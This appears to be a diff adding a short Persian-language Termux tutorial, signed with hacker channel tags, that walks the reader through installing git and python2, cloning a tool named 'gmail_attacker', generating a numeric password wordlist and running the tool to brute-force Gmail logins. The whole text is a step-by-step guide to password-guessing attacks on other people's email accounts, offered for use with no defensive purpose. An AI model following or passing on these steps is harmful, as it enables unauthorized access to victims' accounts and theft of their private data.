@@ -1,0 +1,39 @@
+
+
+apt update
+
+apt upgrade
+
+pkg install git
+
+pkg install python2
+
+هرجا Y یا n اومد بزنید Y
+
+
+git clone https://github.com/AyoubSirai/gmail_attacker.git
+
+با دستور زیر وارد پوشه  بشید
+
+cd gmail_attacker
+
+اسم فایلو تغییر بدید به Pass.txt و توی پوشه جیمیل اتکر کپی کنید
+
+pass.txt
+
+
+➖➖➖➖
+واس ساخت پسورد لیست اینو بزنید.اگه دارید که هیچ
+wordlist -m 3 -M 7 -o pass.txt -v 1234567890
+
+➖➖➖➖➖
+بعد دستور زیر میزنیم فایل فراخوانی بشه
+python2 gmail_attacker.py
+
+بقیه رو مثل فیلم پیش برید
+و بگم چندجا باید ls بزنید...به فیلم دقت کنید
+
+➖➖➖➖➖➖➖➖➖➖
+@Mahdiihack
+#Hacked16 | #Matin_Cyber
+#
